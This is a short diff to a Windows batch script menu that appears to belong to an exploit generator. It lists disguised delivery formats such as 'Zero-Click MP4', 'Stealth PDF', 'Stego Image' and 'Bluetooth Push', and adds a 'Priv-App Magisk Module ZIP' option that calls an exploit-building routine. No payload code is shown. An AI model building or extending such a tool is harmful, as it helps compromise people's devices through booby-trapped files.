@@ -184,9 +184,11 @@ echo     1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite
 echo     4. Dolby Audio       5. ADB Script      6. Bluetooth Push
 echo     7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle
 echo     10. Office Word      11. Office Excel   12. Ghost GIF
-echo     13. Return to Main Menu
+echo     13. Priv-App Magisk Module ZIP
+echo     14. Return to Main Menu
 set /p "EXPLOIT_CHOICE=    Choice: "
-if "!EXPLOIT_CHOICE!"=="13" goto :main_menu
+if "!EXPLOIT_CHOICE!"=="13" call :generate_exploit_standalone "privapp" "http://127.0.0.1:8080"
+if "!EXPLOIT_CHOICE!"=="14" goto :main_menu
 call :generate_exploit_standalone "pdf" "http://127.0.0.1:8080" "Security_Audit"
 pause
 goto :main_menu
